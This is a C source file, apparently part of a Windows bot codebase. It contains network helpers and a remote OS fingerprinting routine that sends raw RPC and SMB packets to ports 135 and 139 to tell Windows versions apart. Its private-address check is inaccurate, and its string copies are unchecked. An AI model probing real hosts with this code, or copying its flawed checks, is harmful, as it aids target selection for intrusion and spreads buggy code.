#include "../includes/includes.h"
#include "../includes/functions.h"
#include "../includes/extern.h"

// Standard TCP/UDP checksum function.
USHORT checksum(USHORT *buffer, int size)
{
    unsigned long cksum=0;

    while (size > 1) {
        cksum += *buffer++;
        size  -= sizeof(USHORT);   
    }

    if (size)
        cksum += *(UCHAR*)buffer;   

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >>16); 

    return (USHORT)(~cksum); 
}

char *GetIP(SOCKET sock)
{
	static char IP[16];

	SOCKADDR sa;
	int sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	getsockname(sock, &sa, &sas);

	sprintf(IP,"%d.%d.%d.%d",(BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);

	return (IP);
}

bool IsPrivate(const char *ip)
{	if(!ip) return false; if(!strcmp(ip, "")) return false;
	char *tokens[4]; char ipbuf[32]; strncpy(ipbuf, ip, 32); tokens[0]=strtok(ipbuf, "."); if(!tokens[0]) return false;
	for(int i=1;i<4;i++) { tokens[i]=strtok(NULL, "."); if(!tokens[i]) return false; }
	if(!strcmp(tokens[0], "10")) return true;								// Class A private network
	if(!strcmp(tokens[0], "172") && !strcmp(tokens[1], "16")) return true;	// Class B Private network
	if(!strcmp(tokens[0], "192") && !strcmp(tokens[1], "168")) return true;	// Class C private network
	if(!strcmp(tokens[0], "90") && !strcmp(tokens[1], "0")) return true;	// Class Bastart private network :P
	return false; }

unsigned long ResolveAddress(char *szHost)
{
	unsigned long IP = finet_addr(szHost);
	if (IP==INADDR_NONE) {
		hostent *pHE = fgethostbyname(szHost);
		if (pHE == 0) 
			return INADDR_NONE;
		IP = *((unsigned long *)pHE->h_addr_list[0]);	
	}

	return IP;
}



//---- OS DETECT ------//

//for FP_RPC
char rpcfp_bindstr[]=
	"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00"
	"\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
	"\x80\xbd\xa8\xaf\x8a\x7d\xc9\x11\xbe\xf4\x08\x00\x2b\x10\x29\x89"
	"\x01\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
	"\x2b\x10\x48\x60\x02\x00\x00\x00";

char rpcfp_inqifids[]=
	"\x05\x00\x00\x03\x10\x00\x00\x00\x18\x00\x00\x00\x01\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00";

char w2kuuid_sig[]=
	"\xB0\x01\x52\x97\xCA\x59\xD0\x11\xA8\xD5\x00\xA0\xC9\x0D\x80\x51";

char wxpuuid_sig[]=
	"\x26\xB5\x55\x1D\x37\xC1\xC5\x46\xAB\x79\x63\x8F\x2A\x68\xE8\x69";

//for FP_SMB
char sessionrequest[] =
"\x81\x00\x00\x44\x20\x43\x4b\x46\x44\x45\x4e\x45\x43\x46\x44\x45"
"\x46\x46\x43\x46\x47\x45\x46\x46\x43\x43\x41\x43\x41\x43\x41\x43"
"\x41\x43\x41\x43\x41\x00\x20\x45\x4b\x45\x44\x46\x45\x45\x49\x45"
"\x44\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43"
"\x41\x43\x41\x43\x41\x41\x41\x00";

char negotiate[] =
"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5c\x02"
"\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e"
"\x31\x32\x00";

char setupaccount[] =
"\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5c\x02"
"\x00\x00\x00\x00\x0d\xff\x00\x00\x00\xff\xff\x02\x00\x5c\x02\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0b"
"\x00\x00\x00\x4a\x43\00\x41\x54\x54\x48\x43\x00";

bool MemContains(const char *pMem, const int iMemLen, const char *pSearch, const int iSearchLen)
{	for(int i=0;i<iMemLen-iSearchLen;i++)
		if(!memcmp(pMem+i, pSearch, iSearchLen))
			return true;
	return false; }

int fphost(char *sHost,int iFpType)
{
	switch(iFpType) {
		case FP_RPC:
		{
			int sSocket,RetVal=OS_UNKNOWN;
			char szRecvBuf[8192];
			struct sockaddr_in rpctcp;
			WSADATA wsaData;

			if (WSAStartup(MAKEWORD(2,1),&wsaData) != 0) return RetVal;
			memset(&rpctcp, 0, sizeof(rpctcp));

			rpctcp.sin_addr.s_addr = inet_addr(sHost);
			rpctcp.sin_family = AF_INET;
			rpctcp.sin_port=htons(135);

			if((sSocket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET) return RetVal;
			if(connect(sSocket, (struct sockaddr *) &rpctcp, sizeof(struct sockaddr_in))==SOCKET_ERROR) return RetVal;
			if(send(sSocket,rpcfp_bindstr,sizeof(rpcfp_bindstr)-1,0)==SOCKET_ERROR)
				{ closesocket(sSocket); return RetVal; }
			if(recv(sSocket,szRecvBuf,sizeof(szRecvBuf),0)==SOCKET_ERROR)
				{ closesocket(sSocket); return RetVal; }
			if(szRecvBuf[2]==DCE_PKT_BINDACK)
			{
				if(send(sSocket,rpcfp_inqifids,sizeof(rpcfp_inqifids)-1,0)==SOCKET_ERROR)
					{ closesocket(sSocket); return RetVal; }		
				int iRead=0;
				iRead=recv(sSocket,szRecvBuf,sizeof(szRecvBuf),0);
				if(iRead==SOCKET_ERROR) { closesocket(sSocket); return RetVal; }
				if(szRecvBuf[2]==DCE_PKT_RESPONSE)
				{
					if(MemContains(szRecvBuf, iRead, w2kuuid_sig, sizeof(w2kuuid_sig)-1))
					{
						if(iRead<300) RetVal=OS_WINNT;
						else RetVal=OS_WIN2K;
					}
					else if(MemContains(szRecvBuf, iRead, wxpuuid_sig, sizeof(wxpuuid_sig)-1))
						RetVal=OS_WINXP;
					else
						RetVal=OS_UNKNOWN;
				} else { closesocket(sSocket); return RetVal; }
			} else { closesocket(sSocket); return RetVal; }
		}
		break;
		case FP_SMB:
		// From THCsmbgetOS.c
		{
			int sock,rc,RetVal=OS_UNKNOWN;
			unsigned short smbport=139;
			unsigned char *infobuf;
			struct sockaddr_in smbtcp;
			unsigned char *sWorkgroup;
			unsigned char *sServer;
			unsigned char *sOS;
			WSADATA wsaData;

			if (WSAStartup(MAKEWORD(2,1),&wsaData) != 0) return RetVal;
			memset(&smbtcp, 0, sizeof(smbtcp));

			smbtcp.sin_addr.s_addr = inet_addr(sHost);
			smbtcp.sin_family = AF_INET;
			smbtcp.sin_port=htons(smbport);

			infobuf=(unsigned char *)malloc(256);
			memset(infobuf,0,256);

			if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET)
				{	if(infobuf!=NULL) free(infobuf); return RetVal; }
			if(connect(sock, (struct sockaddr *) &smbtcp, sizeof(struct sockaddr_in))==SOCKET_ERROR)
				{	if(infobuf!=NULL) free(infobuf); return RetVal; }

			if(send(sock,sessionrequest,sizeof(sessionrequest)-1,0)==SOCKET_ERROR)
				{	if(infobuf!=NULL) free(infobuf); closesocket(sock); return RetVal; }
			rc=recv(sock,(char *)infobuf,256,0);
			if(rc==SOCKET_ERROR)
				{	if(infobuf!=NULL) free(infobuf); closesocket(sock); return RetVal; }

			memset(infobuf,0,256);
			if(send(sock,negotiate,sizeof(negotiate)-1,0)==SOCKET_ERROR)
				{	if(infobuf!=NULL) free(infobuf); closesocket(sock); return RetVal; }
			rc=recv(sock,(char *)infobuf,256,0);
			if(rc==SOCKET_ERROR)
				{	if(infobuf!=NULL) free(infobuf); closesocket(sock); return RetVal; }

			memset(infobuf,0,256);
			if(send(sock,setupaccount,sizeof(setupaccount)-1,0)==SOCKET_ERROR)
				{	if(infobuf!=NULL) free(infobuf); closesocket(sock); return RetVal; }
			rc=recv(sock,(char *)infobuf,256,0);
			if(rc==SOCKET_ERROR)
				{	if(infobuf!=NULL) free(infobuf); closesocket(sock); return RetVal; }

			if (rc==0) { RetVal=OS_WINXP; closesocket(sock); if(infobuf!=NULL) free(infobuf); return RetVal; }
			else
			{
				int i=rc; unsigned int zeroc=0; i--;
				sWorkgroup=(unsigned char*)malloc(256); memset(sWorkgroup,0,256);
				sServer=(unsigned char*)malloc(256); memset(sServer,0,256);
				sOS=(unsigned char*)malloc(256); memset(sOS,0,256);
				while ((--i>0)&&(zeroc<4))
				{
					if (infobuf[i]==0x00)
					{
						switch(zeroc) {
						case 0: strcpy((char *)sWorkgroup,(char*)&(infobuf[i+1])); break;
						case 1: strcpy((char *)sServer,(char*)&(infobuf[i+1])); break;
						case 2: strcpy((char *)sOS,(char*)&(infobuf[i+1])); break;
						default: break;
						}
						zeroc++;
					}

				}
				if(strcmp((const char *)sOS,"Windows Server 2003 3790")==0) RetVal=OS_WIN2K3;
				else if(strcmp((const char *)sOS,"Windows NT 4.0")==0) RetVal=OS_WINNT;
				else if(strcmp((const char *)sOS,"Windows 5.0")==0) RetVal=OS_WIN2K;
				else if(strcmp((const char *)sOS,"Windows 5.1")==0) RetVal=OS_WINXP;
				else if(strcmp((const char *)sOS,"Unix")==0) RetVal=OS_LINUX;

				if(sWorkgroup!=NULL) free(sWorkgroup);
				if(sServer!=NULL) free(sServer);
				if(sOS!=NULL) free(sOS);
			}
			shutdown(sock,1);
			closesocket(sock);
			if(infobuf!=NULL) free(infobuf);
			return RetVal;
		}
		break;
	}
	return OS_UNKNOWN;
}

//---- END OS DETECT ------//